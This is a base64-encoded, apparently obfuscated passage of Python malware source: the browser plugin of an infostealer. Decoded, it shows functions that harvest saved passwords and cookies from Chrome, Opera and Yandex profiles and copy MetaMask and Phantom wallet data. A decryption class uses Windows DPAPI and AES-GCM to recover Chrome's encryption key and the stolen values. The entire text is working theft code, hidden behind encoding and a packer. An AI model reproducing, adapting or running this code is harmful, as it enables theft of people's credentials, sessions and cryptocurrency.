Jvd3MuYXBwZW5kKChyb3dbMV0sIHJvd1szXSwgc2VsZi5kZWNyeXB0b3IuZGVjcnlwdF9wYXNzd29yZChyb3dbNV0pKSlcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGF3YWl0IHNlbGYuY29uZi5sb2dnZXIubG9nKGYnXHhkMFx4OWVceGQxXHg4OFx4ZDBceGI4XHhkMFx4YjFceGQwXHhiYVx4ZDBceGIwIFx4ZDBceGJmXHhkMVx4ODBceGQwXHhiOCBceGQwXHhiNFx4ZDBceGI1XHhkMFx4YmFceGQxXHg4MFx4ZDBceGI4XHhkMFx4YmZceGQxXHg4Mlx4ZDBceGI1IFx4ZDBceGJmXHhkMFx4YjBceGQxXHg4MFx4ZDBceGJlXHhkMFx4YmJceGQxXHg4Ziwge2V9JylcclxuICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZTpcclxuICAgICAgICAgICAgICAgICAgICBhd2FpdCBzZWxmLmNvbmYubG9nZ2VyLmxvZyhmJ1x4ZDBceDllXHhkMVx4ODhceGQwXHhiOFx4ZDBceGIxXHhkMFx4YmFceGQwXHhiMCBceGQwXHhiZlx4ZDFceDgwXHhkMFx4YjggXHhkMFx4YmZceGQwXHhiZVx4ZDBceGJmXHhkMVx4OGJceGQxXHg4Mlx4ZDBceGJhXHhkMFx4YjUgXHhkMVx4ODFceGQwXHhiZlx4ZDBceGI4XHhkMFx4YjdceGQwXHhiNFx4ZDBceGI4XHhkMVx4ODJceGQxXHg4YyBceGQwXHhiZlx4ZDBceGIwXHhkMVx4ODBceGQwXHhiZVx4ZDBceGJiXHhkMFx4YjggXHhkMVx4ODEge3B9LCBceGQwXHhiZVx4ZDFceDg4XHhkMFx4YjhceGQwXHhiMVx4ZDBceGJhXHhkMFx4YjAge2V9JylcclxuXHJcbiAgICAgICAgICAgIGlmIHJvd3M6XHJcbiAgICAgICAgICAgICAgICBuYW1lID0gZid7c3BsaXQocm9vdF9wYXRoKVsxXX1fe3Rva2VuX2hleCg1KX0udHh0J1xyXG4gICAgICAgICAgICAgICAgcGFzc3dvcmRzX3BhdGggPSBqb2luKHNlbGYuY29uZi5sb2dfcGF0aCwgJ3Bhc3N3b3JkcycpXHJcbiAgICAgICAgICAgICAgICBwYXRoID0gam9pbihwYXNzd29yZHNfcGF0aCwgbmFtZSlcclxuXHJcbiAgICAgICAgICAgICAgICBpZiBub3QgaXNkaXIocGFzc3dvcmRzX3BhdGgpOlxyXG4gICAgICAgICAgICAgICAgICAgIG1rZGlyKHBhc3N3b3Jkc19wYXRoKVxyXG5cclxuICAgICAgICAgICAgICAgIGFzeW5jIHdpdGggb3BlbihwYXRoLCAndycsIGVuY29kaW5nPSd1dGY4JykgYXMgZjpcclxuICAgICAgICAgICAgICAgICAgICBmb3IgdXJsLCBsb2dpbiwgcGFzc3dvcmQgaW4gcm93czpcclxuICAgICAgICAgICAgICAgICAgICAgICAgYXdhaXQgZi53cml0ZShmJ1VSTDoge3VybH1cXG5Mb2dpbjoge2xvZ2lufVxcblBhc3N3b3JkOiB7cGFzc3dvcmR9XFxuXFxuJylcclxuXHJcbiAgICAgICAgICAgICAgICBhd2FpdCBzZWxmLmNvbmYubG9nZ2VyLmxvZyhmJ1x4ZDBceGExXHhkMFx4YmZceGQwXHhiOFx4ZDBceGI3XHhkMFx4YjZceGQwXHhiNVx4ZDBceGJkXHhkMVx4OGIgXHhkMFx4YmZceGQwXHhiMFx4ZDFceDgwXHhkMFx4YmVceGQwXHhiYlx4ZDBceGI4IFx4ZDFceDgxIHtyb290X3BhdGh9JylcclxuICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6XHJcbiAgICAgICAgICAgIGF3YWl0IHNlbGYuY29uZi5sb2dnZXIubG9nKGYnRXJyb3IgaW4gc3RlYWxfcGFzc3dvcmQ6IHtlfScpXHJcblxyXG4gICAgYXN5bmMgZGVmIHN0ZWFsX2Nvb2tpZXMoc2VsZiwgcm9vdF9wYXRoOiBzdHIpIC0+IE5vbmU6XHJcbiAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICBpZiBub3QgaXNkaXIocm9vdF9wYXRoKTpcclxuICAgICAgICAgICAgICAgIHJldHVybiBbXVxyXG5cclxuICAgICAgICAgICAgY29va2llcyA9ICcnXHJcblxyXG4gICAgICAgICAgICBjb29raWVfZm9sZGVyX3BhdGhzID0ge1xyXG4gICAgICAgICAgICAgICAgam9pbihyb290X3BhdGgsICd1c2VyIGRhdGEnLCAnZGVmYXVsdCcsICduZXR3b3JrJyksIFxyXG4gICAgICAgICAgICAgICAgam9pbihyb290X3BhdGgsICd1c2VyIGRhdGEnLCAnZGVmYXVsdCcpLFxyXG4gICAgICAgICAgICAgICAgcm9vdF9wYXRoXHJcbiAgICAgICAgICAgIH1cclxuXHJcbiAgICAgICAgICAgIGFzeW5jIGZvciBwIGluIHNlYXJjaF9wYXRocyhjb29raWVfZm9sZGVyX3BhdGhzLCB7J0Nvb2tpZXMnLCAnY29va2llcy5zcWxpdGUnfSk6XHJcbiAgICAgICAgICAgICAgICBpZiBub3QgaXNmaWxlKHApOlxyXG4gICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlXHJcblxyXG4gICAgICAgICAgICAgICAgdGVtcF9wYXRoID0gam9pbihURU1QLCBmJ0Nvb2tpZXMge3RpbWUoKX0nKVxyXG4gICAgICAgICAgICAgICAgYXdhaXQgY29weWZpbGUocCwgdGVtcF9wYXRoKVxyXG5cclxuICAgICAgICAgICAgICAgIGlmIG5vdCBzZWxmLmRlY3J5cHRvcjpcclxuICAgICAgICAgICAgICAgICAgICBhd2FpdCBzZWxmLnNldF9kZWNyeXB0b3Iocm9vdF9wYXRoKVxyXG4gICAgICAgICAgICAgICAgICAgICAgICBcclxuICAgICAgICAgICAgICAgIGFzeW5jIHdpdGggYWlvc3FsaXRlLmNvbm5lY3QodGVtcF9wYXRoKSBhcyBjb25uOlxyXG4gICAgICAgICAgICAgICAgICAgIHNxbCA9ICdzZWxlY3QgKiBmcm9tIGNvb2tpZXMnXHJcbiAgICAgICAgICAgICAgICAgICAgYXN5bmMgd2l0aCBjb25uLmV4ZWN1dGUoc3FsKSBhcyBjdXJyOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICBhc3luYyBmb3Igcm93IGluIGN1cnI6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb252ID0gbGFtYmRhIHg6ICdUUlVFJyBpZiB4IGVsc2UgJ0ZBTFNFJ1xyXG5cclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRyeTpcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBob3N0ID0gcm93WzFdXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaHR0cF9vbmx5ID0gY29udihyb3dbOV0pXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGF0aCA9IHJvd1s2XVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlY3VyZSA9IGNvbnYocm93WzhdKVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4cGlyYXRpb25fZGF0ZSA9IHN0cihyb3dbN10pXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbmFtZSA9IHJvd1szXVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhbHVlID0gc2VsZi5kZWNyeXB0b3IuZGVjcnlwdF9wYXNzd29yZChyb3dbNV0pXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYXdhaXQgc2VsZi5jb25mLmxvZ2dlci5sb2coZidceGQwXHg5ZVx4ZDFceDg4XHhkMFx4YjhceGQwXHhiMVx4ZDBceGJhXHhkMFx4YjAgXHhkMFx4YmZceGQxXHg4MFx4ZDBceGI4IFx4ZDBceGI0XHhkMFx4YjVceGQwXHhiYVx4ZDFceDgwXHhkMFx4YjhceGQwXHhiZlx4ZDFceDgyXHhkMFx4YjUgXHhkMFx4YmFceGQxXHg4M1x4ZDBceGJhXHhkMFx4YjAsIHtlfScpXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCB2YWx1ZTpcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YWx1ZSA9ICcnXHJcblxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgY29va2llID0gJ1xcdCcuam9pbihcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAoaG9zdCwgaHR0cF9vbmx5LCBwYXRoLCBzZWN1cmUsIGV4cGlyYXRpb25fZGF0ZSwgbmFtZSwgdmFsdWUpKVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgY29va2llcyArPSBjb29raWUgKyAnXFxuJ1xyXG5cclxuICAgICAgICAgICAgaWYgY29va2llczpcclxuICAgICAgICAgICAgICAgIG5hbWUgPSBmJ3tzcGxpdChyb290X3BhdGgpWzFdfV97dG9rZW5faGV4KDUpfS50eHQnXHJcbiAgICAgICAgICAgICAgICBjb29raWVzX3BhdGggPSBqb2luKHNlbGYuY29uZi5sb2dfcGF0aCwgJ2Nvb2tpZXMnKVxyXG4gICAgICAgICAgICAgICAgcGF0aCA9IGpvaW4oY29va2llc19wYXRoLCBuYW1lKVxyXG4gICAgICAgICAgICAgICAgXHJcbiAgICAgICAgICAgICAgICBpZiBub3QgaXNkaXIoY29va2llc19wYXRoKTpcclxuICAgICAgICAgICAgICAgICAgICBta2Rpcihjb29raWVzX3BhdGgpXHJcblxyXG4gICAgICAgICAgICAgICAgYXN5bmMgd2l0aCBvcGVuKHBhdGgsICd3JywgZW5jb2Rpbmc9J3V0ZjgnKSBhcyBmOlxyXG4gICAgICAgICAgICAgICAgICAgIGF3YWl0IGYud3JpdGUoY29va2llcylcclxuICAgICAgICAgICAgXHJcbiAgICAgICAgICAgICAgICBhd2FpdCBzZWxmLmNvbmYubG9nZ2VyLmxvZyhmJ1x4ZDBceGExXHhkMFx4YmZceGQwXHhiOFx4ZDBceGI3XHhkMFx4YjZceGQwXHhiNVx4ZDBceGJkXHhkMVx4OGIgXHhkMFx4YmFceGQxXHg4M1x4ZDBceGJhXHhkMFx4YjggXHhkMVx4ODEge3Jvb3RfcGF0aH0nKVxyXG4gICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZTpcclxuICAgICAgICAgICAgYXdhaXQgc2VsZi5jb25mLmxvZ2dlci5sb2coZidFcnJvciBpbiBzdGVhbF9jb29raWVzOiB7ZX0nKVxyXG5cclxuXHJcbiAgICBhc3luYyBkZWYgc3RlYWxfd2FsbGV0cyhzZWxmLCByb290X3BhdGg6IHN0cikgLT4gTm9uZTpcclxuICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgIGlmIG5vdCBpc2Rpcihyb290X3BhdGgpOlxyXG4gICAgICAgICAgICAgICAgcmV0dXJuIFtdXHJcblxyXG4gICAgICAgICAgICB3YWxsZXRfZm9sZGVyX3BhdGhzID0ge1xyXG4gICAgICAgICAgICAgICAgam9pbihyb290X3BhdGgsICd1c2VyIGRhdGEnLCAnZGVmYXVsdCcsICdsb2NhbCBleHRlbnNpb24gc2V0dGluZ3MnKSwgXHJcbiAgICAgICAgICAgICAgICBqb2luKHJvb3RfcGF0aCwgJ3VzZXIgZGF0YScsICdsb2NhbCBleHRlbnNpb24gc2V0dGluZ3MnKSwgXHJcbiAgICAgICAgICAgICAgICBqb2luKHJvb3RfcGF0aCwgJ2xvY2FsIGV4dGVuc2lvbiBzZXR0aW5ncycpXHJcbiAgICAgICAgICAgIH1cclxuXHJcbiAgICAgICAgICAgIHdhbGxldHMgPSB7XHJcbiAgICAgICAgICAgICAgICAnbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4nOiAnbWV0YW1hc2snLFxyXG4gICAgICAgICAgICAgICAgJ2JmbmFlbG1vbWVpbWhscG1nam5qb3BoaHBra29sanBhJzogJ3BoYW50b20nXHJcbiAgICAgICAgICAgIH1cclxuXHJcbiAgICAgICAgICAgIGFzeW5jIGZvciBwIGluIHNlYXJjaF9wYXRocyh3YWxsZXRfZm9sZGVyX3BhdGhzLCBzZXQod2FsbGV0cy5rZXlzKCkpKTpcclxuICAgICAgICAgICAgICAgIGlmIG5vdCBpc2RpcihwKTpcclxuICAgICAgICAgICAgICAgICAgICBjb250aW51ZVxyXG4gICAgICAgICAgICAgICAgXHJcbiAgICAgICAgICAgICAgICB3YWxsZXRzX3BhdGggPSBqb2luKHNlbGYuY29uZi5sb2dfcGF0aCwgJ3dhbGxldHMnKVxyXG4gICAgICAgICAgICAgICAgaWYgbm90IGlzZGlyKHdhbGxldHNfcGF0aCk6XHJcbiAgICAgICAgICAgICAgICAgICAgbWtkaXIod2FsbGV0c19wYXRoKVxyXG5cclxuICAgICAgICAgICAgICAgIG5hbWUgPSBzcGxpdChwKVsxXVxyXG4gICAgICAgICAgICAgICAgd2FsbGV0X25hbWUgPSB3YWxsZXRzW25hbWVdXHJcbiAgICAgICAgICAgICAgICBkZXN0X3BhdGggPSBqb2luKHdhbGxldHNfcGF0aCwgZid7d2FsbGV0X25hbWV9X3t0b2tlbl9oZXgoNCl9JylcclxuXHJcbiAgICAgICAgICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgICAgICAgICAgYXdhaXQgY29weXRyZWUocCwgZGVzdF9wYXRoKVxyXG4gICAgICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOlxyXG4gICAgICAgICAgICAgICAgICAgIHBhc3NcclxuXHJcbiAgICAgICAgICAgICAgICBhd2FpdCBzZWxmLmNvbmYubG9nZ2VyLmxvZyhmJ1x4ZDBceGExXHhkMFx4YmZceGQwXHhiOFx4ZDBceGI3XHhkMFx4YjZceGQwXHhiNVx4ZDBceGJkIFx4ZDBceGIyXHhkMFx4YjVceGQwXHhiMSBceGQwXHhiYVx4ZDBceGJlXHhkMVx4ODhceGQwXHhiNVx4ZDBceGJiXHhkMVx4OGMgXHhkMVx4ODEge3B9JylcclxuICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6XHJcbiAgICAgICAgICAgIGF3YWl0IHNlbGYuY29uZi5sb2dnZXIubG9nKGYnXHhkMFx4OWVceGQxXHg4OFx4ZDBceGI4XHhkMFx4YjFceGQwXHhiYVx4ZDBceGIwIFx4ZDBceGJmXHhkMVx4ODBceGQwXHhiOCBceGQwXHhiZlx4ZDBceGJlXHhkMFx4YmZceGQxXHg4Ylx4ZDFceDgyXHhkMFx4YmFceGQwXHhiNSBceGQxXHg4MVx4ZDBceGJmXHhkMFx4YjhceGQwXHhiN1x4ZDBceGI0XHhkMFx4YjhceGQxXHg4Mlx4ZDFceDhjIFx4ZDBceGIyXHhkMFx4YjVceGQwXHhiMSBceGQwXHhiYVx4ZDBceGJlXHhkMVx4ODhceGQwXHhiNVx4ZDBceGJiXHhkMFx4YjVceGQwXHhiYSB7cm9vdF9wYXRofScpXHJcbiAgICBcclxuXHJcbiAgICBhc3luYyBkZWYgY2FsbGJhY2soc2VsZiwgcGF0aDogc3RyKSAtPiBOb25lOlxyXG4gICAgICAgIGNocm9taXVtX2Jyb3dzZXJfbmFtZXMgPSB7XHJcbiAgICAgICAgICAgICdvcGVyYSBneCBzdGFibGUnLFxyXG4gICAgICAgICAgICAnb3BlcmEgc3RhYmxlJyxcclxuICAgICAgICAgICAgJ2Nocm9tZScsXHJcbiAgICAgICAgICAgICd5YW5kZXhicm93c2VyJ1xyXG4gICAgICAgIH1cclxuXHJcbiAgICAgICAgdGFza3M6IExpc3RbVGFza10gPSBbXVxyXG5cclxuICAgICAgICBmb3IgZm9sZGVyX25hbWUgaW4gY2hyb21pdW1fYnJvd3Nlcl9uYW1lcy5pbnRlcnNlY3Rpb24oaS5uYW1lLmxvd2VyKCkgZm9yIGkgaW4gc2NhbmRpcihwYXRoKSk6XHJcbiAgICAgICAgICAgIHJvb3RfcGF0aCA9IGpvaW4ocGF0aCwgZm9sZGVyX25hbWUpXHJcbiAgICAgICAgICAgIHRhc2tzLmFwcGVuZChjcmVhdGVfdGFzayhzZWxmLnN0ZWFsX3Bhc3N3b3JkKHJvb3RfcGF0aCkpKVxyXG4gICAgICAgICAgICB0YXNrcy5hcHBlbmQoY3JlYXRlX3Rhc2soc2VsZi5zdGVhbF9jb29raWVzKHJvb3RfcGF0aCkpKVxyXG4gICAgICAgICAgICB0YXNrcy5hcHBlbmQoY3JlYXRlX3Rhc2soc2VsZi5zdGVhbF93YWxsZXRzKHJvb3RfcGF0aCkpKVxyXG5cclxuICAgICAgICBmb3IgdGFzayBpbiB0YXNrczpcclxuICAgICAgICAgICAgdGFzay5hZGRfZG9uZV9jYWxsYmFjayhsYW1iZGEgeDogX2hhbmRsZV90YXNrX3Jlc3VsdCh4LCBzZWxmLmNvbmYubG9nZ2VyKSlcclxuICAgICAgICAgICAgXHJcbiAgICAgICAgZm9yIHRhc2sgaW4gdGFza3M6XHJcbiAgICAgICAgICAgIHRyeTpcclxuICAgICAgICAgICAgICAgIGF3YWl0IHRhc2tcclxuICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOlxyXG4gICAgICAgICAgICAgICAgYXdhaXQgc2VsZi5jb25mLmxvZ2dlci5sb2coZidFcnJvciBpbiBjaHJvbWl1bSB0YXNrczoge2V9JylcclxuICAgICAgICAgICAgICAgICIpI2xpbmU6NjMKICAgIF9fTzBPME8wME8wME8wTzBPME8gKCdwbHVnaW5zL2Jyb3dzZXJzL2RlY3J5cHQucHknLGInIyBodHRwczovL2dpdGh1Yi5jb20vaGFrYW5vbnltb3Mvc3RlYWwtY2hyb21lLXBhc3N3b3JkLWFsbC12ZXJzaW9uL2Jsb2IvbWFzdGVyL2xvY2FsLnB5XHJcblxyXG5cclxuaW1wb3J0IGN0eXBlc1xyXG5pbXBvcnQgY3R5cGVzLndpbnR5cGVzXHJcbmZyb20gY3J5cHRvZ3JhcGh5Lmhhem1hdC5iYWNrZW5kcyBpbXBvcnQgZGVmYXVsdF9iYWNrZW5kXHJcbmZyb20gY3J5cHRvZ3JhcGh5Lmhhem1hdC5wcmltaXRpdmVzLmNpcGhlcnMgaW1wb3J0IChcclxuICAgIENpcGhlciwgYWxnb3JpdGhtcywgbW9kZXMpXHJcbmltcG9ydCBiYXNlNjRcclxuaW1wb3J0IG9zXHJcbmltcG9ydCBqc29uXHJcblxyXG5cclxuY2xhc3MgRGVjcnlwdG9yOlxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIHBhdGgpIC0+IE5vbmU6XHJcbiAgICAgICAgaWYgcGF0aCBpcyBOb25lOlxyXG4gICAgICAgICAgICBzZWxmLnBhdGggPSBvcy5wYXRoLmpvaW4ob3MuZW52aXJvbltcJ0xPQ0FMQVBQREFUQVwnXSwgciJHb29nbGVcXENocm9tZVxcVXNlciBEYXRhXFxMb2NhbCBTdGF0ZSIpXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgc2VsZi5wYXRoID0gcGF0aFxyXG4gICAgICAgIFxyXG4gICAgICAgIHNlbGYua2V5ID0gTm9uZVxyXG4gICAgICAgIHNlbGYuY2lwaGVyID0gTm9uZVxyXG5cclxuICAgIEBzdGF0aWNtZXRob2RcclxuICAgIGRlZiBkcGFwaV9kZWNyeXB0KGVuY3J5cHRlZCk6XHJcbiAgICAgICAgY2xhc3MgREFUQV9CTE9CKGN0eXBlcy5TdHJ1Y3R1cmUpOlxyXG4gICAgICAgICAgICBfZmllbGRzXyA9IFsoXCdjYkRhdGFcJywgY3R5cGVzLndpbnR5cGVzLkRXT1JEKSxcclxuICAgICAgICAgICAgICAgICAgICAgICAgKFwncGJEYXRhXCcsIGN0eXBlcy5QT0lOVEVSKGN0eXBlcy5jX2NoYXIpKV1cclxuXHJcbiAgICAgICAgcCA9IGN0eXBlcy5jcmVhdGVfc3RyaW5nX2J1ZmZlcihlbmNyeXB0ZWQsIGxlbihlbmNyeXB0ZWQpKVxyXG4gICAgICAgIGJsb2JpbiA9IERBVEFfQkxPQihjdHlwZXMuc2l6ZW9mKHApLCBwKVxyXG4gICAgICAgIGJsb2JvdXQgPSBEQVRBX0JMT0IoKVxyXG4gICAgICAgIHJldHZhbCA9IGN0eXBlcy53aW5kbGwuY3J5cHQzMi5DcnlwdFVucHJvdGVjdERhdGEoXHJcbiAgICAgICAgICAgIGN0eXBlcy5ieXJlZihibG9iaW4pLCBOb25lLCBOb25lLCBOb25lLCBOb25lLCAwLCBjdHlwZXMuYnlyZWYoYmxvYm91dCkpXHJcbiAgICAgICAgaWYgbm90IHJldHZhbDpcclxuICAgICAgICAgICAgcmFpc2UgY3R5cGVzLldpbkVycm9yKClcclxuICAgICAgICByZXN1bHQgPSBjdHlwZXMuc3RyaW5nX2F0KGJsb2JvdXQucGJEYXRhLCBibG9ib3V0LmNiRGF0YSlcclxuICAgICAgICBjdHlwZXMud2luZGxsLmtlcm5lbDMyLkxvY2FsRnJlZShibG9ib3V0LnBiRGF0YSlcclxuICAgICAgICByZXR1cm4gcmVzdWx0XHJcblxyXG4gICAgQHN0YXRpY21ldGhvZFxyXG4gICAgZGVmIGRlY3J5cHQoY2lwaGVyLCBjaXBoZXJ0ZXh0LCBub25jZSk6XHJcbiAgICAgICAgY2lwaGVyLm1vZGUgPSBtb2Rlcy5HQ00obm9uY2UpXHJcbiAgICAgICAgZGVjcnlwdG9yID0gY2lwaGVyLmRlY3J5cHRvcigpXHJcbiAgICAgICAgcmV0dXJuIGRlY3J5cHRvci51cGRhdGUoY2lwaGVydGV4dClcclxuXHJcbiAgICBkZWYgZ2V0X2tleV9mcm9tX2xvY2FsX3N0YXRlKHNlbGYpOlxyXG4gICAgICAgIGpzbiA9IE5vbmVcclxuICAgICAgICB3aXRoIG9wZW4oc2VsZi5wYXRoLCBcJ3JcJykgYXMgZjpcclxuICAgICAgICAgICAganNuID0ganNvbi5sb2FkcyhzdHIoZi5yZWFkbGluZSgpKSlcclxuICAgICAgICByZXR1cm4ganNuW1wnb3NfY3J5cHRcJ11bXCdlbmNyeXB0ZWRfa2V5XCddXHJcblxyXG4gICAgQHN0YXRpY21ldGhvZFxyXG4gICAgZGVmIGdldF9jaXBoZXIoa2V5KTpcclxuICAgICAgICBjaXBoZXIgPSBDaXBoZXIoXHJcbiAgICAgICAgICAgIGFsZ29yaXRobXMuQUVTKGtleSksXHJcbiAgICAgICAgICAgIE5vbmUsXHJcbiAgICAgICAgICAgIGJhY2tlbmQ9ZGVmYXVsdF9iYWNrZW5kKClcclxuICAgICAgICApXHJcbiAgICAgICAgcmV0dXJuIGNpcGhlclxyXG5cclxuICAgIGRlZiBhZXNfZGVjcnlwdChzZWxmLCBlbmNyeXB0ZWRfdHh0KTpcclxuICAgICAgICBpZiBzZWxmLmtleSBpcyBOb25lOlxyXG4gICAgICAgICAgICBlbmNvZGVkX2tleSA9IHNlbGYuZ2V0X2tleV9mcm9tX2xvY2FsX3N0YXRlKClcclxuICAgICAgICAgICAgZW5jcnlwdGVkX2tleSA9IGJhc2U2NC5iNjRkZWNvZGUoZW5jb2RlZF9rZXkuZW5jb2RlKCkpXHJcbiAgICAgICAgICAgIGVuY3J5cHRlZF9rZXkgPSBlbmNyeXB0ZWRfa2V5WzU6XVxyXG4gICAgICAgICAgICBzZWxmLmtleSA9IERlY3J5cHRvci5kcGFwaV9kZWNyeXB0KGVuY3J5cHRlZF9rZXkpXHJcbiAgICAgICAgICAgIHNlbGYuY2lwaGVyID0gRGVjcnlwdG9yLmdldF9jaXBoZXIoc2VsZi5rZXkpXHJcbiAgICAgICAgXHJcbiAgICAgICAgbm9uY2UgPSBlbmNyeXB0ZWRfdHh0WzM6MTVdXHJcblxyXG4gICAgICAgIHJldHVybiBEZWNyeXB0b3IuZGVjcnlwdChzZWxmLmNpcGhlcixlbmNyeXB0ZWRfdHh0WzE1Ol0sbm9uY2UpXHJcblxyXG4gICAgZGVmIGRlY3J5cHRfcGFzc3dvcmQoc2VsZiwgZGF0YSk6XHJcbiAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICBpZiBkYXRhWzo0XSA9PSBiXCdcXHgwMVxceDAwXFx4MDBcXHgwMFwnOlxyXG4gICAgICAgICAgICAgICAgZGVjcnlwdGVkID0gRGVjcnlwdG9yLmRwYXBpX2RlY3J5cHQoZGF0YSlcclxuICAgICAgICAgICAgICAgIHJldHVybiBkZWNyeXB0ZWQuZGVjb2RlKClcclxuICAgICAgICAgICAgZWxpZiBkYXRhWzozXSA9PSBiXCd2MTBcJzpcclxuICAgICAgICAgICAgICAgIGRlY3J5cHRlZCA9IHNlbGYuYWVzX2RlY3J5cHQoZGF0YSlcclxuICAgICAgICAgICAgICAgIHJldHVybiBkZWNyeXB0ZWRbOi0xNl0uZGVjb2RlKClcclxuICAgICAgICBleGNlcHQ6XHJcbiAgICAgICAgICAgIHJldHVybiBOb25lJykjbGluZTo2NAogICAgX19PME8wTzAwTzAwTzBPME8wTyAoJ3BsdWdpbnMvYnJvd3NlcnMvQ2hyb21pdW0ucHknLGIiZnJvbSBhc3luY2lvIGltcG9ydCBUYXNrLCBjcmVhdGVfdGFza1xyXG5mcm9tIHR5cGluZyBpbXBvcnQgTGlzdFxyXG5mcm9tIHBsdWdpbnMgaW1wb3J0IFBsdWdpblxyXG5mcm9tIGNvbmZpZyBpbXBvcnQgQ29uZmlnXHJcbmZyb20gb3MgaW1wb3J0IHNjYW5kaXIsIG1rZGlyXHJcbmZyb20gb3MucGF0aCBpbXBvcnQgam9pbiwgaXNkaXIsIGlzZmlsZSwgc3BsaXRcclxuZnJvbSB0b29scyBpbXBvcnQgY29weWZpbGUsIGNvcHl0cmVlLCBfaGFuZGxlX3Rhc2tfcmVzdWx0XHJcbmZyb20gcGF0aF9zZWFyY2ggaW1wb3J0IHNlYXJjaF9wYXRoc1xyXG5pbXBvcnQgYWlvc3FsaXRlXHJcbmZyb20gLmRlY3J5cHQgaW1wb3J0IERlY3J5cHRvclxyXG5mcm9tIHRpbWUgaW1wb3J0IHRpbWVcclxuZnJvbSBwYXRocyBpbXBvcnQgVEVNUFxyXG5mcm9tIHNlY3JldHMgaW1wb3J0IHRva2VuX2hleFxyXG5mcm9tIGFpb2ZpbGVzIGltcG9ydCBvcGVuXHJcblxyXG5cclxuXHJcbmNsYXNzIENocm9taXVtKFBsdWdpbik6XHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwgY29uZjogQ29uZmlnKSAtPiBOb25lOlxyXG4gICAgICAgIHNlbGYuY29uZiA9IGNvbmZcclxuICAgICAgICBzZWxmLmRlY3J5cHRvciA9IE5vbmVcclxuXHJcblxyXG4gICAgYXN5bmMgZGVmIHNldF9kZWNyeXB0b3Ioc2VsZiwgcm9vdF9wYXRoOiBzdHIpIC0+IE5vbmU6XHJcbiAgICAgICAgbG9jYWxfc3RhdGVfZm9sZGVycyA9IHtcclxuICAgICAgICAgICAgam9pbihyb290X3BhdGgsICd1c2VyIGRhdGEnKSxcclxuICAgICAgICAgICAgcm9vdF9wYXRoXHJcbiAgICAgICAgfVxyXG5cclxuICAgICAgICBsb2NhbF9zdGF0ZXMgPSBbXVxyXG4gICAgICAgIGFzeW5jIGZvciBpIGluIHNlYXJjaF9wYXRocyhsb2NhbF9zdGF0ZV9mb2xkZXJzLCB7J0xvY2FsIFN0YXRlJ30pOlxyXG4gICAgICAgICAgICBsb2NhbF9zdGF0ZXMuYXBwZW5kKGkpXHJcblxyXG4gICAgICAgIGlmIGxvY2FsX3N0YXRlczpcclxuICAgICAgICAgICAgbG9jYWxfc3RhdGVfcGF0aCA9IGxvY2FsX3N0YXRlc1swXVxyXG4gICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgIGxvY2FsX3N0YXRlX3BhdGggPSBOb25lXHJcblxyXG4gICAgICAgIHNlbGYuZGVjcnlwdG9yID0gRGVjcnlwdG9yKGxvY2FsX3N0YXRlX3BhdGgpXHJcblxyXG5cclxuICAgIGFzeW5jIGRlZiBzdGVhbF9wYXNzd29yZChzZWxmLCByb290X3BhdGg6IHN0cikgLT4gTm9uZTpcclxuICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgIHJvd3MgPSBbXVxyXG5cclxuICAgICAgICAgICAgaWYgbm90IGlzZGlyKHJvb3RfcGF0aCk6XHJcbiAgICAgICAgICAgICAgICByZXR1cm4gW11cclxuXHJcbiAgICAgICAgICAgIGxvZ2luX2RhdGFfZm9sZGVyX3BhdGhzID0ge1xyXG4gICAgICAgICAgICAgICAgam9pbihyb290X3BhdGgsICd1c2VyIGRhdGEnLCAnZGVmYXVsdCcpLFxyXG4gICAgICAgICAgICAgICAgcm9vdF9wYXRoXHJcbiAgICAgICAgICAgIH1cclxuXHJcbiAgICAgICAgICAgIGFzeW5jIGZvciBwIGluIHNlYXJjaF9wYXRocyhsb2dpbl9kYXRhX2ZvbGRlcl9wYXRocywgeydMb2dpbiBEYXRhJ30pOlxyXG4gICAgICAgICAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICAgICAgICAgIGlmIG5vdCBpc2ZpbGUocCk6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlXHJcbiAgICAgICAgICAgICAgICAgICAgXHJcbiAgICAgICAgICAgICAgICAgICAgdGVtcF9wYXRoID0